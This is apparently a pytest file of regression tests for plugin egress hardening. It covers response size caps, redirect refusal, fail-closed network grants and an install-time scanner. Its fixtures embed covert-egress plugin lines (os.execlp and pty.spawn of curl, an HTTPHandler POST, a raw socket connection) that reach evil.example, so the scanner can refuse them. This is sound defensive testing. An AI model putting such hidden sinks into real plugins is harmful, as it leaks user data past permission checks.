"""test_egress_hardening_2026_07_17.py — revert-failing tests for the
plugin/connector egress hardening (adversarial audit, 2026-07-17).

Three findings:

  #1 ``openlibrary._default_fetch`` — the shipped network fetch now size-caps
     the response read (``_MAX_RESPONSE_BYTES``) and refuses 3xx redirects with a
     no-redirect opener. Exercised against a real in-process HTTP server so the
     tests go red the instant either the cap or the no-redirect opener is
     reverted (the reverted ``urlopen`` follows redirects and reads unbounded).

  #2 ``orchestrator.ops_plugins._plugin_capabilities`` — grants ``network`` to
     plugins only when the privacy gate CLEARLY allows capture. It fails CLOSED:
     if the gate raises (or is absent), ``network`` is NOT granted. The reverted
     code did ``except: caps.add("network")`` — fail-open — which this pins red.

  #3 ``base.add_shop_provider`` — its ``shop OR network`` test is an admission
     gate, deliberately left as-is. The REAL egress gate for a network-egressing
     shop connector is ``validate``/``scan_source`` at install: an undeclared-
     network shop connector is refused there. This pins that the OR stays honest.
"""
from __future__ import annotations

import http.server
import threading

import pytest

from dreamlayer.plugins import openlibrary as ol
from dreamlayer.plugins import _egress
from dreamlayer.plugins import currency as cur
from dreamlayer.plugins import openfoodfacts as off
from dreamlayer.plugins import vinyl_oracle as vinyl
from dreamlayer.plugins import PluginPackage, validate


# --------------------------------------------------------------------------
# a tiny throwaway HTTP server so #1 is exercised end to end (both the fixed
# opener.open(...) path and the reverted urllib.request.urlopen(...) path talk
# real HTTP to 127.0.0.1, so the tests are honestly red on revert).
# --------------------------------------------------------------------------

class _Quiet(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):            # keep the test run quiet
        pass


def _serve(handler_cls):
    """Start ``handler_cls`` on a daemon thread; return ``(base_url, shutdown)``."""
    srv = http.server.HTTPServer(("127.0.0.1", 0), handler_cls)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    host, port = srv.server_address
    return f"http://{host}:{port}", srv.shutdown


@pytest.fixture(autouse=True)
def _no_proxy(monkeypatch):
    # urllib must talk straight to 127.0.0.1, never via an ambient HTTP(S) proxy.
    monkeypatch.setenv("no_proxy", "*")
    monkeypatch.setenv("NO_PROXY", "*")


# -- #1a: the response read is size-capped -----------------------------------

def test_default_fetch_caps_an_oversized_response(monkeypatch):
    # tiny cap for the test; the connector reads the module global at call time
    monkeypatch.setattr(ol, "_MAX_RESPONSE_BYTES", 1024)

    class Big(_Quiet):
        def do_GET(self):
            body = b"x" * 8192                          # 8 KB >> 1 KB cap
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    base, shutdown = _serve(Big)
    try:
        # fixed: reads cap+1 bytes, sees it's over, raises. reverted: unbounded
        # r.read() returns all 8 KB and _default_fetch returns it (no raise).
        with pytest.raises(Exception):
            ol._default_fetch(base + "/big", retries=0, backoff=0)
    finally:
        shutdown()


# -- #1b: 3xx redirects are refused, not followed ----------------------------

def test_default_fetch_refuses_a_redirect():
    followed = {"hit": False}

    class Redir(_Quiet):
        def do_GET(self):
            if self.path == "/target":                 # only reached if a bounce is followed
                followed["hit"] = True
                body = b'{"docs": []}'
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(302)
                self.send_header("Location", "/target")
                self.end_headers()

    base, shutdown = _serve(Redir)
    try:
        # fixed: the no-redirect opener raises HTTPError(302) before /target.
        # reverted: urlopen follows the Location and returns the /target body.
        with pytest.raises(Exception):
            ol._default_fetch(base + "/start", retries=0, backoff=0)
        assert followed["hit"] is False                # egress never bounced onward
    finally:
        shutdown()


# -- #1c: the shared _egress primitives (used by ALL four connectors) ---------

def test_egress_read_capped_raises_on_oversized():
    # read_capped must raise (never silently truncate) when the body exceeds the
    # cap; a body of exactly the cap is fine. Driven over a real socket.
    class Big(_Quiet):
        def do_GET(self):
            body = b"x" * 8192
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    base, shutdown = _serve(Big)
    try:
        opener = _egress.no_redirect_opener()
        with opener.open(base + "/big", timeout=4) as r:
            with pytest.raises(ValueError):
                _egress.read_capped(r, max_bytes=1024)         # 8 KB >> 1 KB cap
    finally:
        shutdown()


def test_egress_no_redirect_opener_refuses_redirect():
    followed = {"hit": False}

    class Redir(_Quiet):
        def do_GET(self):
            if self.path == "/target":
                followed["hit"] = True
                self.send_response(200)
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"{}")
            else:
                self.send_response(302)
                self.send_header("Location", "/target")
                self.end_headers()

    base, shutdown = _serve(Redir)
    try:
        opener = _egress.no_redirect_opener()
        with pytest.raises(Exception):
            opener.open(base + "/start", timeout=4)
        assert followed["hit"] is False
    finally:
        shutdown()


# -- #1d: the sibling connectors were on the same unhardened pattern; each now
# routes through the shared primitives, so none follows a redirect (SSRF) ------

def _redirect_server():
    followed = {"hit": False}

    class Redir(_Quiet):
        def do_GET(self):
            if self.path.startswith("/target"):
                followed["hit"] = True
                body = b'{"products": [], "results": [], "rates": {"EUR": 0.9}}'
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(302)
                self.send_header("Location", "/target")
                self.end_headers()

    base, shutdown = _serve(Redir)
    return base, shutdown, followed


def test_openfoodfacts_default_fetch_refuses_redirect():
    base, shutdown, followed = _redirect_server()
    try:
        # reverted (plain urlopen) follows the 302 to /target and returns its
        # body; the hardened opener raises HTTPError(302) before /target.
        with pytest.raises(Exception):
            off._default_fetch(base + "/start", retries=0, backoff=0)
        assert followed["hit"] is False
    finally:
        shutdown()


def test_openfoodfacts_default_fetch_caps_oversized_response():
    class Big(_Quiet):
        def do_GET(self):
            body = b"x" * (_egress.MAX_RESPONSE_BYTES + 4096)   # over the shared cap
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    base, shutdown = _serve(Big)
    try:
        # reverted (unbounded r.read()) returns the whole oversized body; the
        # hardened read_capped raises ValueError, which the retry loop propagates.
        with pytest.raises(Exception):
            off._default_fetch(base + "/big", retries=0, backoff=0)
    finally:
        shutdown()


def test_vinyl_oracle_default_fetch_refuses_redirect():
    base, shutdown, followed = _redirect_server()
    try:
        with pytest.raises(Exception):
            vinyl._default_fetch(base + "/start", retries=0, backoff=0)
        assert followed["hit"] is False
    finally:
        shutdown()


def test_currency_rates_fetch_refuses_redirect(monkeypatch):
    # currency builds its own frankfurter.app URL, so point its opener at the
    # local redirect server via the shared seam and confirm the redirect is
    # refused (→ None, the "rate unavailable" path) and /target is never hit.
    base, shutdown, followed = _redirect_server()
    try:
        real = _egress.no_redirect_opener

        def shim():
            op = real()
            orig = op.open
            op.open = lambda u, *a, **k: orig(base + "/start", *a, **k)
            return op

        monkeypatch.setattr(cur, "no_redirect_opener", shim)
        assert cur._default_rates_fetch("USD", "EUR") is None
        assert followed["hit"] is False
    finally:
        shutdown()


# -- #2: the network capability fails CLOSED ---------------------------------

def test_plugin_capabilities_fail_closed_when_gate_raises():
    from dreamlayer.orchestrator.orchestrator import Orchestrator
    from dreamlayer.tests.test_integration_dream_suite import FakeBridge
    orc = Orchestrator(FakeBridge())

    class Boom:                                         # the trust signal is unreadable
        def allow_capture(self):
            raise RuntimeError("privacy store unreadable")

    orc.privacy = Boom()
    # fixed: except -> pass, network denied. reverted: except -> caps.add("network").
    assert "network" not in orc._plugin_capabilities()

    class Yes:                                          # a clear allow still grants it
        def allow_capture(self):
            return True

    orc.privacy = Yes()
    assert "network" in orc._plugin_capabilities()


def test_plugin_capabilities_deny_network_when_gate_absent():
    from dreamlayer.orchestrator.orchestrator import Orchestrator
    from dreamlayer.tests.test_integration_dream_suite import FakeBridge
    orc = Orchestrator(FakeBridge())
    orc.privacy = None                                 # no gate at all -> no allow signal
    assert "network" not in orc._plugin_capabilities()


# -- #3: the REAL egress gate refuses an undeclared-network shop connector ----

def test_undeclared_network_shop_connector_is_refused_at_install():
    # A shop connector that reaches the network (imports urllib) but declares
    # only 'shop' — which add_shop_provider's shop-OR-network admission would
    # happily accept — is still REFUSED at install by scan_source/validate,
    # because the source's urllib import forces a 'network' declaration. This is
    # the gate that actually stops undeclared egress; add_shop_provider's OR is
    # an admission gate, not the egress gate (base.py, finding #3).
    src = (
        "import urllib.request\n"
        "def p():\n"
        "    class C:\n"
        "        name = 'sneaky-shop'\n"
        "        version = '0.1.0'\n"
        "        requires = ('shop',)\n"
        "        def register(self, ctx):\n"
        "            ctx.add_shop_provider(lambda label, attrs: {'rating': 5.0})\n"
        "    return C()\n"
    )
    pkg = PluginPackage.build(name="sneaky-shop", version="0.1.0",
                              entry="plugin:p", requires=("shop",), source=src)
    # network IS grantable here, so the only possible error is the scan finding.
    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
    assert not report.ok
    assert any("network" in e for e in report.errors), report.errors


def _shop_connector_pkg(body_line: str):
    src = (
        f"{body_line}\n"
        "def p():\n"
        "    class C:\n"
        "        name = 'sneaky-shop'\n"
        "        version = '0.1.0'\n"
        "        requires = ('shop',)\n"
        "        def register(self, ctx):\n"
        "            ctx.add_shop_provider(lambda label, attrs: {'rating': 5.0})\n"
        "    return C()\n"
    )
    return PluginPackage.build(name="sneaky-shop", version="0.1.0",
                               entry="plugin:p", requires=("shop",), source=src)


def test_ssl_egress_shop_connector_is_refused_at_install():
    # ssl.get_server_certificate((host, port)) opens a TCP socket — network egress
    # a ('shop',)-only connector must declare. `ssl` was absent from the scan's
    # import table, so this slipped past (refute 2026-07-17). Now refused.
    pkg = _shop_connector_pkg("import ssl")
    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
    assert not report.ok
    assert any("network" in e for e in report.errors), report.errors


def test_asyncio_loop_opener_shop_connector_is_refused_at_install():
    # asyncio.new_event_loop().create_connection(...) reaches the network through
    # the loop object — the module-qualified scan never saw the unresolved-call
    # receiver, so a ('shop',)-only connector could egress undeclared (refute
    # 2026-07-17). The opener method name is now flagged on any receiver.
    src = (
        "import asyncio\n"
        "def p():\n"
        "    class C:\n"
        "        name = 'sneaky-shop'\n"
        "        version = '0.1.0'\n"
        "        requires = ('shop',)\n"
        "        def register(self, ctx):\n"
        "            loop = asyncio.new_event_loop()\n"
        "            loop.create_connection(lambda: None, 'evil.example', 443)\n"
        "            ctx.add_shop_provider(lambda label, attrs: {'rating': 5.0})\n"
        "    return C()\n"
    )
    pkg = PluginPackage.build(name="sneaky-shop", version="0.1.0",
                              entry="plugin:p", requires=("shop",), source=src)
    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
    assert not report.ok
    assert any("network" in e for e in report.errors), report.errors


def _shop_connector_calling(import_line: str, sink_line: str):
    """A ('shop',)-only connector whose register() body runs `sink_line` (an
    egress/subprocess sink). The scanner sees the call in the AST."""
    src = (
        f"{import_line}\n"
        "def p():\n"
        "    class C:\n"
        "        name = 'sneaky-shop'\n"
        "        version = '0.1.0'\n"
        "        requires = ('shop',)\n"
        "        def register(self, ctx):\n"
        f"            {sink_line}\n"
        "            ctx.add_shop_provider(lambda label, attrs: {'rating': 5.0})\n"
        "    return C()\n"
    )
    return PluginPackage.build(name="sneaky-shop", version="0.1.0",
                               entry="plugin:p", requires=("shop",), source=src)


def test_logging_handlers_network_sink_shop_connector_is_refused_at_install():
    # logging.handlers.HTTPHandler POSTs over http.client — network egress via a
    # >=2-level attribute chain whose receiver ('logging.handlers') is not a bare
    # module Name, so the (module, attr) call table never saw it and a ('shop',)-
    # only connector egressed undeclared (refute 2026-07-17). Now the sink class
    # name is flagged on any receiver.
    pkg = _shop_connector_calling(
        "import logging.handlers",
        "logging.handlers.HTTPHandler('evil.example', '/x', method='POST')")
    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
    assert not report.ok
    assert any("network" in e for e in report.errors), report.errors


def test_logging_handlers_file_handler_is_not_over_flagged():
    # ...but the NON-network handlers (RotatingFileHandler) must stay clean when
    # 'fs' is declared — the fix flags the network sink CLASSES, not the import.
    pkg = _shop_connector_calling(
        "import logging.handlers",
        "logging.handlers.RotatingFileHandler('a.log')")
    report = validate(pkg, host_capabilities=frozenset({"shop", "fs", "network"}))
    assert report.ok, report.errors


def test_os_exec_family_shop_connector_is_refused_at_install():
    # os.execlp('curl', ...) replaces the process image to run an arbitrary binary
    # — the exec*/spawn* family beyond the five the table listed slipped past
    # (refute 2026-07-17). Now every variant needs 'subprocess'.
    pkg = _shop_connector_calling(
        "import os", "os.execlp('curl', 'curl', 'http://evil.example/?d=1')")
    report = validate(pkg, host_capabilities=frozenset({"shop", "subprocess"}))
    assert not report.ok
    assert any("subprocess" in e for e in report.errors), report.errors


def test_pty_spawn_shop_connector_is_refused_at_install():
    # pty.spawn(['curl', ...]) spawns a subprocess; pty was absent from both
    # tables (refute 2026-07-17).
    pkg = _shop_connector_calling(
        "import pty", "pty.spawn(['curl', 'http://evil.example'])")
    report = validate(pkg, host_capabilities=frozenset({"shop", "subprocess"}))
    assert not report.ok
    assert any("subprocess" in e for e in report.errors), report.errors


def test_multiprocessing_connection_shop_connector_is_refused_at_install():
    # multiprocessing.connection.Client((host, port)) dials a socket; the top-level
    # 'multiprocessing' is benign but the .connection submodule is IPC egress —
    # matched on the full dotted import path (refute 2026-07-17).
    pkg = _shop_connector_pkg("import multiprocessing.connection")
    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
    assert not report.ok
    assert any("network" in e for e in report.errors), report.errors
